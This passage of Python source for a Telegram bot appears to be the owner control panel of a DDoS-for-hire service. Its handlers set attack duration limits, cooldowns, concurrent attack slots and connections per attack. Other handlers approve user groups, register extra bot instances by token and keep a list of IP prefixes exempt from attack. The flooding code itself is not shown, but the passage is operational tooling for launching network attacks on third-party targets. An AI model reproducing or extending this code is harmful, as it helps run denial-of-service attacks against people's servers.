            f"{HTML_EMOJI.CROSS} <b>𝑹𝒆𝒎𝒐𝒗𝒆 𝑮𝒓𝒐𝒖𝒑</b>\n\n𝑺𝒆𝒏𝒅: <code>/delgrp &lt;name&gt;</code>\n\n𝑼𝒔𝒆 /grpinfo 𝒕𝒐 𝒔𝒆𝒆 𝒈𝒓𝒐𝒖𝒑 𝒏𝒂𝒎𝒆𝒔.\n\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        
    elif call.data == "group_list":
        groups = list(approved_groups_collection.find())
        if not groups:
            response = f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝒈𝒓𝒐𝒖𝒑𝒔 𝒇𝒐𝒖𝒏𝒅!"
        else:
            response = f"{HTML_EMOJI.USERS} <b>𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 𝑮𝑹𝑶𝑼𝑷𝑺</b>\n\n"
            for i, group in enumerate(groups, 1):
                status = f"{HTML_EMOJI.CHECKMARK} 𝑨𝒄𝒕𝒊𝒗𝒆" if not group.get('expiry_date') or group['expiry_date'] > datetime.now() else f"{HTML_EMOJI.CROSS} 𝑬𝒙𝒑𝒊𝒓𝒆𝒅"
                response += f"{i}. <b>{group.get('name', 'Unknown')}</b>\n"
                response += f"   {HTML_EMOJI.PROFILE} 𝑮𝒓𝒐𝒖𝒑 𝑰𝑫: <code>{group['group_id']}</code>\n"
                response += f"   {HTML_EMOJI.STATS} 𝑺𝒕𝒂𝒕𝒖𝒔: {status}\n"
                response += f"   {HTML_EMOJI.SETTINGS} 𝑴𝒂𝒙 𝑻𝒊𝒎𝒆: {group.get('max_attack_time', get_max_attack_time())}s\n"
                response += f"   {HTML_EMOJI.TARGET} 𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔: {group.get('max_slots', current_max_slots)}\n"
                response += f"   {HTML_EMOJI.TIMER} 𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏: {group.get('cooldown', get_user_cooldown_setting())}s\n"
                response += f"   {HTML_EMOJI.CAMERA} 𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅: {'𝑶𝑵' if group.get('feedback_required', get_setting('feedback_required', True)) else '𝑶𝑭𝑭'}\n"
                if group.get('expiry_date'):
                    response += f"   {HTML_EMOJI.CALENDAR} 𝑬𝒙𝒑𝒊𝒓𝒆𝒔: {group['expiry_date'].strftime('%d-%m-%Y')}\n"
                response += "\n"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")
        
    elif call.data == "bot_add":
        bot.edit_message_text(
            f"{HTML_EMOJI.ARROW_RIGHT} <b>𝑨𝒅𝒅 𝑩𝒐𝒕</b>\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 𝒃𝒐𝒕 𝒕𝒐𝒌𝒆𝒏:\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: <code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>\n\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, get_bot_token)
        
    elif call.data == "bot_remove":
        bots = get_all_bots()
        if not bots:
            bot.edit_message_text(f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝒃𝒐𝒕𝒔 𝒇𝒐𝒖𝒏𝒅!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        else:
            bot_list = f"{HTML_EMOJI.DISCORD} <b>𝑨𝒄𝒕𝒊𝒗𝒆 𝑩𝒐𝒕𝒔:</b>\n\n"
            for b in bots:
                bot_list += f"• 𝑰𝑫: <code>{b['bot_id']}</code> | 𝑨𝒄𝒕𝒊𝒗𝒆: {'✅' if b.get('active') else '❌'}\n"
            bot_list += "\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 𝑩𝒐𝒕 𝑰𝑫 𝒐𝒓 𝑻𝒐𝒌𝒆𝒏 𝒕𝒐 𝒅𝒆𝒍𝒆𝒕𝒆:\n𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕."
            bot.edit_message_text(bot_list, call.message.chat.id, call.message.message_id, parse_mode="HTML")
            bot.register_next_step_handler(call.message, process_del_bot)
        
    elif call.data == "bot_list":
        bots = get_all_bots()
        if not bots:
            response = f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝒃𝒐𝒕𝒔 𝒇𝒐𝒖𝒏𝒅!"
        else:
            response = f"{HTML_EMOJI.DISCORD} <b>𝑨𝑳𝑳 𝑩𝑶𝑻𝑺</b>\n\n"
            for b in bots:
                status = f"{HTML_EMOJI.CHECKMARK} 𝑹𝒖𝒏𝒏𝒊𝒏𝒈" if b.get('active') else f"{HTML_EMOJI.CROSS} 𝑺𝒕𝒐𝒑𝒑𝒆𝒅"
                response += f"<b>𝑩𝒐𝒕 𝑰𝑫:</b> <code>{b['bot_id']}</code>\n"
                response += f"<b>𝑺𝒕𝒂𝒕𝒖𝒔:</b> {status}\n"
                response += f"<b>𝑶𝒘𝒏𝒆𝒓:</b> {b['owner_id']}\n"
                response += f"<b>𝑺𝒍𝒐𝒕𝒔:</b> {b.get('max_slots', 1)}\n"
                response += "──────────────────\n"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")

def set_max_time_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        value = int(message.text.strip())
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑽𝒂𝒍𝒖𝒆 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂𝒕 𝒍𝒆𝒂𝒔𝒕 {MIN_ATTACK_TIME} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_setting('max_attack_time', value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆 𝒔𝒆𝒕 𝒕𝒐 {value} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def set_cooldown_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        value = int(message.text.strip())
        if value < 0:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒄𝒂𝒏𝒏𝒐𝒕 𝒃𝒆 𝒏𝒆𝒈𝒂𝒕𝒊𝒗𝒆!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_setting('user_cooldown', value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒔𝒆𝒕 𝒕𝒐 {value} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def set_slots_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        global current_max_slots
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        current_max_slots = value
        set_setting('max_concurrent_slots', value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑴𝒂𝒙 𝒔𝒍𝒐𝒕𝒔 𝒔𝒆𝒕 𝒕𝒐 {value}!</b>\n\n𝑵𝒐𝒘 {value} 𝒂𝒕𝒕𝒂𝒄𝒌𝒔 𝒄𝒂𝒏 𝒓𝒖𝒏 𝒔𝒊𝒎𝒖𝒍𝒕𝒂𝒏𝒆𝒐𝒖𝒔𝒍𝒚.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def set_concurrent_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        set_concurrent_limit(value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑪𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒑𝒆𝒓 𝒂𝒕𝒕𝒂𝒄𝒌 𝒔𝒆𝒕 𝒕𝒐 {value}!</b>\n\n𝑬𝒂𝒄𝒉 𝑨𝑷𝑰 𝒄𝒂𝒍𝒍 𝒘𝒊𝒍𝒍 𝒖𝒔𝒆 {value} 𝒄𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏𝒔.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def block_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    ip_prefix = message.text.strip()
    
    if add_blocked_ip(ip_prefix):
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>\n\n𝑨𝒏𝒚 𝑰𝑷 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 {ip_prefix} 𝒄𝒂𝒏𝒏𝒐𝒕 𝒃𝒆 𝒂𝒕𝒕𝒂𝒄𝒌𝒆𝒅.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒃𝒍𝒐𝒄𝒌 𝑰𝑷!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def unblock_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    ip_prefix = message.text.strip()
    
    if remove_blocked_ip(ip_prefix):
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒖𝒏𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅 𝒊𝒏 𝒃𝒍𝒐𝒄𝒌𝒆𝒅 𝒍𝒊𝒔𝒕!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        
def get_bot_token(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑶𝒑𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    bot_token = message.text.strip()
    
    if ":" in bot_token:
        try:
            test_bot = telebot.TeleBot(bot_token)
            bot_info = test_bot.get_me()
            bot_id = bot_info.id
            
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒐𝒕 𝒊𝒅𝒆𝒏𝒕𝒊𝒇𝒊𝒆𝒅:</b> <b>{bot_info.first_name}</b> (@{bot_info.username})\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 <b>𝑨𝒅𝒎𝒊𝒏/𝑶𝒘𝒏𝒆𝒓 𝑰𝑫</b> 𝒇𝒐𝒓 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕:", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            bot.register_next_step_handler(message, lambda m: get_bot_admin(m, bot_token, bot_id))
        except Exception as e:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒕𝒐𝒌𝒆𝒏!</b> 𝑬𝒓𝒓𝒐𝒓: {str(e)}\n\n𝑼𝒔𝒆 /addbot 𝒕𝒐 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒕𝒐𝒌𝒆𝒏 𝒇𝒐𝒓𝒎𝒂𝒕!</b>\n\n𝑼𝒔𝒆 /addbot 𝒕𝒐 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def get_bot_admin(message, bot_token, bot_id):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑶𝒑𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        admin_id = int(message.text.strip())
        
        bot.reply_to(message, f"{HTML_EMOJI.SETTINGS} <b>𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔</b>\n\n𝑯𝒐𝒘 𝒎𝒂𝒏𝒚 𝒄𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒂𝒕𝒕𝒂𝒄𝒌𝒔 𝒄𝒂𝒏 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕 𝒉𝒂𝒏𝒅𝒍𝒆?\n\n𝑺𝒆𝒏𝒅 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓 (1-10):", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        bot.register_next_step_handler(message, lambda m: get_bot_slots(m, bot_token, bot_id, admin_id))
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝑰𝑫!</b> 𝑺𝒆𝒏𝒅 𝒂 𝒏𝒖𝒎𝒆𝒓𝒊𝒄 𝑰𝑫.\n\n𝑼𝒔𝒆 /addbot 𝒕𝒐 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def get_bot_slots(message, bot_token, bot_id, admin_id):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑶𝒑𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        max_slots = int(message.text.strip())
        if max_slots < 1:
            max_slots = 1
        if max_slots > 10:
            max_slots = 10
        
        success, result = add_bot(bot_token, admin_id, max_slots)
        
        if success:
            bot_config = get_bot_config(bot_token)
            if bot_config:
                start_bot_instance(bot_config)
            
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒐𝒕 𝑨𝒅𝒅𝒆𝒅 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚!</b>\n\n{HTML_EMOJI.DISCORD} 𝑩𝒐𝒕 𝑰𝑫: <code>{result}</code>\n{HTML_EMOJI.STAR} 𝑶𝒘𝒏𝒆𝒓 𝑰𝑫: {admin_id}\n{HTML_EMOJI.SETTINGS} 𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔: {max_slots}\n\n𝑩𝒐𝒕 𝒊𝒔 𝒏𝒐𝒘 𝒓𝒖𝒏𝒏𝒊𝒏𝒈!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        else:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒂𝒅𝒅 𝒃𝒐𝒕:</b> {result}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>\n\n𝑼𝒔𝒆 /addbot 𝒕𝒐 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def process_del_bot(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑶𝒑𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    bot_input = message.text.strip()
    success, result = delete_bot(bot_input)
    
    if success:
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒐𝒕 𝒅𝒆𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>{result}</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

# ============ LOAD SAVED SETTINGS ============
saved_max_slots = get_setting('max_concurrent_slots', 4)
current_max_slots = saved_max_slots
current_concurrent_value = get_setting('concurrent_per_attack', 4)

# ============ CONVENIENCE COMMANDS ============

@bot.message_handler(commands=["setconcurrent"])
def set_concurrent_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /setconcurrent &lt;value&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /setconcurrent 4\n\n𝑻𝒉𝒊𝒔 𝒔𝒆𝒕𝒔 𝒉𝒐𝒘 𝒎𝒂𝒏𝒚 𝒄𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏𝒔 𝒆𝒂𝒄𝒉 𝑨𝑷𝑰 𝒄𝒂𝒍𝒍 𝒖𝒔𝒆𝒔.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        value = int(command_parts[1])
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        
        set_concurrent_limit(value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑪𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒑𝒆𝒓 𝒂𝒕𝒕𝒂𝒄𝒌 𝒔𝒆𝒕 𝒕𝒐: {value}</b>\n\n𝑬𝒂𝒄𝒉 𝑨𝑷𝑰 𝒄𝒂𝒍𝒍 𝒘𝒊𝒍𝒍 𝒖𝒔𝒆 {value} 𝒄𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏𝒔.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b> 𝑼𝒔𝒆: /setconcurrent &lt;value&gt;", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

@bot.message_handler(commands=["setgrp"])
def set_group_config_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /setgrp &lt;group_id&gt; &lt;setting&gt; &lt;value&gt;\n\n𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔: max_time, cooldown, max_slots, feedback\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /setgrp -100123456789 max_time 300", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    group_id = command_parts[1]
    setting = command_parts[2].lower()
    
    try:
        value = int(command_parts[3])
    except:
        if setting == "feedback":
            value_str = command_parts[3].lower()
            if value_str == "on":
                set_group_feedback_required(group_id, True)
                bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒓𝒆𝒒𝒖𝒊𝒓𝒆𝒅 𝒔𝒆𝒕 𝒕𝒐 𝑶𝑵!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            elif value_str == "off":
                set_group_feedback_required(group_id, False)
                bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒓𝒆𝒒𝒖𝒊𝒓𝒆𝒅 𝒔𝒆𝒕 𝒕𝒐 𝑶𝑭𝑭!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            else:
                bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒗𝒂𝒍𝒖𝒆!</b> 𝑼𝒔𝒆 'on' 𝒐𝒓 'off' 𝒇𝒐𝒓 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        else:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒗𝒂𝒍𝒖𝒆!</b> 𝑴𝒖𝒔𝒕 𝒃𝒆 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
    
    if setting == "max_time":
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑴𝒂𝒙 𝒕𝒊𝒎𝒆 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂𝒕 𝒍𝒆𝒂𝒔𝒕 {MIN_ATTACK_TIME} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_group_max_attack_time(group_id, value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒎𝒂𝒙 𝒂𝒕𝒕𝒂𝒄𝒌 𝒕𝒊𝒎𝒆 𝒔𝒆𝒕 𝒕𝒐 {value} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        
    elif setting == "cooldown":
        if value < 0:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒄𝒂𝒏𝒏𝒐𝒕 𝒃𝒆 𝒏𝒆𝒈𝒂𝒕𝒊𝒗𝒆!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_group_cooldown_time(group_id, value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒄𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒔𝒆𝒕 𝒕𝒐 {value} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        
    elif setting == "max_slots":
        if value < 1 or value > 10:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑴𝒂𝒙 𝒔𝒍𝒐𝒕𝒔 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒃𝒆𝒕𝒘𝒆𝒆𝒏 1 𝒂𝒏𝒅 10!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_group_max_slots(group_id, value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒎𝒂𝒙 𝒔𝒍𝒐𝒕𝒔 𝒔𝒆𝒕 𝒕𝒐 {value}!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒔𝒆𝒕𝒕𝒊𝒏𝒈!</b> 𝑼𝒔𝒆: max_time, cooldown, max_slots, feedback", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

@bot.message_handler(commands=["blockip"])
def block_ip_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /blockip &lt;ip_prefix&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /blockip 20.204\n\n𝑻𝒉𝒊𝒔 𝒃𝒍𝒐𝒄𝒌𝒔 𝒂𝒍𝒍 𝑰𝑷𝒔 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 20.204", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    
    if add_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>\n\n𝑨𝒏𝒚 𝑰𝑷 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 {ip_prefix} 𝒄𝒂𝒏𝒏𝒐𝒕 𝒃𝒆 𝒂𝒕𝒕𝒂𝒄𝒌𝒆𝒅.", reply_to=message)
    else:
